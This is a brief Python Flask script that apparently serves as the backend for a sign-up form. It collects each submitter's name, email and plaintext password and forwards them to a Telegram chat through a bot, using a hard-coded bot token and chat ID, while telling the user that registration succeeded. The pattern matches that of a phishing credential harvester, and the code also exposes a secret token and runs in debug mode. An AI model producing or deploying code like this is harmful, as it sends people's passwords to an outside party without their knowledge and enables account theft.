from flask import Flask, request
import requests

app = Flask(__name__)

# Ваш токен бота и chat_id
TOKEN = '6953628307:AAGJJUqoNf9p3PeLiKzp6k0v0NJl1KJAmpw'
CHAT_ID = '5579006763'

def send_message(text):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': text
    }
    requests.post(url, data=payload)

@app.route('/send_message', methods=['POST'])
def send_telegram_message():
    name = request.form.get('name')
    email = request.form.get('email')
    password = request.form.get('password')

    telegram_message = f"New registration:\nName: {name}\nEmail: {email}\nPassword: {password}"

    send_message(telegram_message)

    return 'Registration successful!'

if __name__ == '__main__':
    app.run(debug=True)
